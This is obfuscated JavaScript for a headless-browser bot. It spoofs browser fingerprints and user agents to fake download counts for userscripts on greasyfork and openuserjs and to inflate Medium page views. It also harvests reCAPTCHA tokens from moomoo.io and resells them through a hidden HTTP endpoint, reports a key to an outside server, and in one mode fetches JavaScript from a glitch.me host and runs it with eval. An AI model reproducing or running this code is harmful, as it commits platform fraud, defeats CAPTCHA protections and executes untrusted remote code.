      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x3) + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + T(0x19, 'i7@c') + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + T(0x14, 'qJ9O') + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + V(0x1a),
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + T(0x4, '^!o4') + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + T(0xb, 'CI29') + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + U(0x18) + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + U(0x16) + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + U(0x5) + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1ee0 + -0x1a6e + 0x394e
  };
if (doFlags['doActivate' + U(0xa)] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1745 + -0xc * 0x29d + -0x1 * -0x36a1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x3b * 0x2e + 0x1916 + -0x234c), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1d13 + -0x1 * -0x18bc + 0x1 * -0x356b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x94 * -0x43 + 0xe * -0xeb + -0x19e2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xb99 * 0x3 + -0x1 * -0x1093 + -0x335e; w < getRandomInt(0x696 * 0x3 + -0x2031 + 0xc70, -0x243b + 0x1914 + 0x41 * 0x2c); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x644 * -0x17 + -0xf68c + 0x150d0);
        }
      }();
    }, 0xa3 * 0x2 + -0x14db + 0x13f9), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const W = c;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })[W(0x9)](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x15f * 0x2 + 0x2101 + -0x1e43;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1bd8 + 0x601 * -0x1 + -0x15d7, 0x1 * -0x1fbb + 0xa9a * -0x1 + 0x2a87)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x19b * -0x7d + 0xbdf3 + -0x11172);
    }, 0x8 * -0xad + -0x1 * -0x241f + -0x7 * 0x455), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const X = d;
        try {
          let s = 0x2 * 0xb73 + -0xb55 + 0x7 * -0x1a7;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto'](X(0xc) + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1101 + -0x11a7 * 0x1 + -0x1 * -0x2e60), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1f24 * 0x1 + 0x3 * -0x33 + 0x1fbd), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1 * -0x161eb3 + 0x65852 + 0x1d8201);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xdd2 + -0x1d34 + 0x1 * 0x2b6a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * -0xe8f + 0x11b0 + -0x259);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xd * 0x32b + 0x2bce + 0x3 * -0x11cf);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xc97 + 0x13 * -0x5c + 0x1 * 0x136c) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x3 * -0xcbb + 0x483 * -0x2 + -0x1d2a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1f3d + -0x1 * -0x1a1 + -0x767 * -0x4, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * 0x283 + 0x4d3 + -0x4a * 0x8, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4b30 * 0x1 + 0x25 * 0x141 + 0x43db),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x6 + 0x3 * 0xc1f + -0x1 * -0x2ad),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
